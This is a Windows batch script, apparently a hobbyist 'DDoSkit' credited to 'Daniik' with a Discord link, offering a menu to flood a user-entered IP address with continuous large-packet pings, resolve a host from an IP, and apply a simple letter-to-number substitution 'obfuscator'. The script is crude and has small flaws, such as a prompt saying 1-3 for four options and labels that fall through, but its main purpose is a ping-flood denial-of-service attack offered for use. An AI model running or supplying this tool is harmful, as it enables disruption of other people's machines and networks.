::      .... NO! ...                  ... MNO! ...
::    ..... MNO!! ...................... MNNOO! ...
::  ..... MMNO! ......................... MNNOO!! .
:: .... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
::  ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
::     ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
::    ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
::    ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
::     ....... MMMMM..    OPPMMP    .,OMI! ....
::      ...... MMMM::   o.,OPMP,.o   ::I!! ...
::          .... NNM:::.,,OOPM!P,.::::!! ....
::          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
::         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
::           .. MMMMMNNOOMMNNIIIPPPOO!! ......
::          ...... MMMONNMMNNNIIIOO!..........
::       ....... MN MOMMMNNNIIIIIO! OO ..........
::    ......... MNO! IiiiiiiiiiiiI OOOO ...........
::  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
::   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
::   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
::      ...... OO! ................. ON! .......
::         ................................
::
::                    Made by Daniik
::              https://discord.gg/5etgDTmwnr
@echo off
chcp 65001
setlocal enableDelayedExpansion
color 2
cls
title DDoSkit
:main
echo.
echo ==========================
echo.
echo  [1]. DDoS                  
echo  [2]. Search PC from IP     
echo.
echo  [3]. Obfuscator
echo  [4]. Deobfuscator
echo ==========================
echo.                                     
set /p input=Choose from 1-3
if %input% == 1 goto :ddos
if %input% == 2 goto :pcsearch
if %input% == 3 goto :Obfus
if %input% == 4 goto :deObfus

:ddos
title DDoS
cls
echo IP Adress to DDoS
echo ==========================
set /p ip=IP: 
echo How much bytes (0-65500)
echo ==========================
set /p bytes=Bytes:
start ping %ip% -t -l %bytes%

:pcsearch
title PCSearch
cls
echo Input IP Adress.
echo ==========================
echo.
set /p ip=IP: 
start ping %ip% -a -l 420
goto :main

:Obfus
set /p code=Text to encrypt:
set chars=0123456789abcdefghijklmnopqrstuvwxyz
for /L %%N in (10 1 36) do (

for /F %%C in ("!chars:~%%N,1!") do (

set "code=!code:%%C=-%%N!"

)

)
echo There is encrypted code : !code!
pause

goto :main

:deObfus
set /p code=Text:
set chars=0123456789abcdefghijklmnopqrstuvwxyz

for /L %%N in (10 1 36) do (

for /F %%C in ("!chars:~%%N,1!") do (

set "code=!code:%%N=-%%C!"

)

)
echo There is decrypted code : !code!
pause
goto :main
